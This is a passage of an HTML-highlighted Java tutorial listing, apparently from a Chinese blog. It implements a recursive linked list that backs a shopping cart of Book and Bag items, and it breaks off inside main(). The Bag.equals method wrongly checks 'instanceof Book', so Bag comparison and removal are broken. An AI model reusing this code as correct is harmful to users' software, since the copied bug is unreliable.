class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> two;</span><br><span class="line"></span><br><span class="line"><span class="comment">//链表超市购物车</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ILink2</span>&lt;E&gt; &#123; <span class="comment">//设置泛型避免安全隐患</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span>;<span class="comment">//增加节点</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span>;<span class="comment">//获取数据个数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span>;<span class="comment">//判断空集合</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray();<span class="comment">//将集合元素以数组形式返回</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>;<span class="comment">//根据索引找到数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span>;<span class="comment">//修改索引数据</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span>;<span class="comment">//判断数据是否存在</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span>;<span class="comment">//数据删除方法</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">()</span>;<span class="comment">//清空集合</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LinkImpl2</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">ILink2</span>&lt;E&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存节点的数据关系</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> E data; <span class="comment">//保存的数据</span></span><br><span class="line">        <span class="keyword">private</span> Node next; <span class="comment">//保存下一个引用</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//限制node必须有数据，有数据才有意义</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Node</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.data = data;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用：this = LinkImpl.root;</span></span><br><span class="line">        <span class="comment">//第二次调用：this = LinkImpl.root.next;</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNode</span><span class="params">(Node newNode)</span> &#123; <span class="comment">//保存新的node数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.next = newNode;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.addNode(newNode);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//第一次调用:this = LinkImpl.root</span></span><br><span class="line">        <span class="comment">//第二次调用:this = LinkImpl.root.next</span></span><br><span class="line">        <span class="comment">//第三次调用: this = LinkImpl.root.next.next;</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">toArrayNode</span><span class="params">()</span> &#123;</span><br><span class="line">            LinkImpl2.<span class="built_in">this</span>.returnData[LinkImpl2.<span class="built_in">this</span>.foot++] = <span class="built_in">this</span>.data;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123;<span class="comment">//还有下一个数据</span></span><br><span class="line">                <span class="built_in">this</span>.next.toArrayNode();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> E <span class="title function_">getNode</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl2.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.next.getNode(index);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setNode</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (LinkImpl2.<span class="built_in">this</span>.foot++ == index) &#123;</span><br><span class="line">                <span class="comment">//索引相同</span></span><br><span class="line">                <span class="built_in">this</span>.data = data;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.next.setNode(index, data);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">containsNode</span><span class="params">(E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;<span class="comment">//对象比较</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next == <span class="literal">null</span>) &#123;<span class="comment">//无后续节点</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">this</span>.next.containsNode(data);<span class="comment">//向后继续判断</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeNode</span><span class="params">(Node previous, E data)</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.data.equals(data)) &#123;</span><br><span class="line">                previous.next = <span class="built_in">this</span>.next;<span class="comment">//空出当前节点</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.next != <span class="literal">null</span>) &#123; <span class="comment">//有后续节点</span></span><br><span class="line">                    <span class="built_in">this</span>.next.removeNode(<span class="built_in">this</span>, data); <span class="comment">//向后继续删除</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的成员----------</span></span><br><span class="line">    <span class="keyword">private</span> Node root; <span class="comment">//保存根元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;<span class="comment">//保存数据个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> foot;<span class="comment">//描述的是操作数组的脚标</span></span><br><span class="line">    <span class="keyword">private</span> Object[] returnData;<span class="comment">//返回的数据保存</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// -----------以下为Link类中定义的方法----------</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(E e)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//数据本身是不具有关联性的,只有Node类有，那么想要实现关联处理就必须将数据包装在Node类之中</span></span><br><span class="line">        <span class="type">Node</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Node</span>(e);<span class="comment">//创建一个新节点</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123; <span class="comment">//现在没有根节点</span></span><br><span class="line">            <span class="built_in">this</span>.root = newNode; <span class="comment">//现在第一个节点作为根节点</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.root.addNode(newNode);<span class="comment">//将新节点保存在合适的位置</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//return this.root == null;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.count == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] toArray() &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;<span class="comment">//无数据</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//脚标清0</span></span><br><span class="line">        <span class="built_in">this</span>.returnData = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="built_in">this</span>.count];<span class="comment">//根据已有的长度开辟数组</span></span><br><span class="line">        <span class="built_in">this</span>.root.toArrayNode();<span class="comment">//利用Node类进行递归数据获取</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.returnData;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> E <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.getNode(index);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> index, E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (index &gt;= <span class="built_in">this</span>.count) &#123;</span><br><span class="line">            <span class="keyword">return</span>;<span class="comment">//方法结束</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//索引数据的获取应该由Node类完成</span></span><br><span class="line">        <span class="built_in">this</span>.foot = <span class="number">0</span>;<span class="comment">//重置索引的下标</span></span><br><span class="line">        <span class="built_in">this</span>.root.setNode(index, data);<span class="comment">//修改数据</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">contains</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.root.containsNode(data);<span class="comment">//交给Node类判断</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(E data)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.contains(data)) &#123; <span class="comment">//判断数据是否存在</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.root.data.equals(data)) &#123; <span class="comment">//根节点为要删除节点</span></span><br><span class="line">                <span class="built_in">this</span>.root = <span class="built_in">this</span>.root.next; <span class="comment">//根的下一个节点</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; <span class="comment">//交由Node类负责删除</span></span><br><span class="line">                <span class="built_in">this</span>.root.next.removeNode(<span class="built_in">this</span>.root, data);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">this</span>.count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.root = <span class="literal">null</span>; <span class="comment">//后续所有的都没了</span></span><br><span class="line">        <span class="built_in">this</span>.count = <span class="number">0</span>; <span class="comment">//个数清零</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IGoods</span> &#123; <span class="comment">//定义商品标准</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice1</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">IShopCar</span> &#123; <span class="comment">//定义购物车标准</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(IGoods goods)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete1</span><span class="params">(IGoods goods)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object[] getAll1();<span class="comment">//获得购物车全部标准信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ShopCarImpl</span> <span class="keyword">implements</span> <span class="title class_">IShopCar</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ILink2&lt;IGoods&gt; allGoodses = <span class="keyword">new</span> <span class="title class_">LinkImpl2</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add1</span><span class="params">(IGoods goods)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.allGoodses.add1(goods);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">delete1</span><span class="params">(IGoods goods)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.allGoodses.remove(goods);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object[] getAll1() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.allGoodses.toArray();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Cashier</span> &#123; <span class="comment">//收银台</span></span><br><span class="line">    <span class="keyword">private</span> IShopCar shopCar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Cashier</span><span class="params">(IShopCar shopCar)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.shopCar = shopCar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">allPrice</span><span class="params">()</span> &#123; <span class="comment">//计算总价</span></span><br><span class="line">        <span class="type">double</span> <span class="variable">all</span> <span class="operator">=</span> <span class="number">0.0</span>;</span><br><span class="line">        Object result[] = <span class="built_in">this</span>.shopCar.getAll1();</span><br><span class="line">        <span class="keyword">for</span> (Object obj : result) &#123;</span><br><span class="line">            <span class="type">IGoods</span> <span class="variable">goods</span> <span class="operator">=</span> (IGoods) obj;</span><br><span class="line">            all += goods.getPrice1();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> all;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">allCount</span><span class="params">()</span> &#123; <span class="comment">//商品数量</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.shopCar.getAll1().length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span> <span class="keyword">implements</span> <span class="title class_">IGoods</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Book</span><span class="params">(String name, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Book)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Book</span> <span class="variable">book</span> <span class="operator">=</span> (Book) obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name.equals(book.name) &amp;&amp; <span class="built_in">this</span>.price == book.price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【图书信息】名称：&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;【图书价格】价格：&quot;</span> + <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bag</span> <span class="keyword">implements</span> <span class="title class_">IGoods</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">double</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Bag</span><span class="params">(String name, <span class="type">double</span> price)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">getPrice1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span> == obj) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!(obj <span class="keyword">instanceof</span> Book)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Bag</span> <span class="variable">bag</span> <span class="operator">=</span> (Bag) obj;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name.equals(bag.name) &amp;&amp; <span class="built_in">this</span>.price == bag.price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;【背包信息】名称：&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot;【背包价格】价格：&quot;</span> + <span class="built_in">this</span>.price;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test66</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">IShopCar</span> <span class="variable">car</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShopCarImpl</span>();</span><br><span class="line">        car.add1(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;java开发&quot;</span>, <span class="number">79.8</span>));</span><br><span class="line">        car.add1(<span class="keyword">new</span> <span class="title class_">Book</span>(<span class="string">&quot;Oracle&quot;</span>, <span class="number">89.8</span>));</span><br><span class="line">        car.add1(<span class="keyword">new</span> <span class="title class_">Bag</span>(<span class="string">&quot;小强背包&quot;</span>, <span class="number">898.1</span>));</span><br><span class="line">        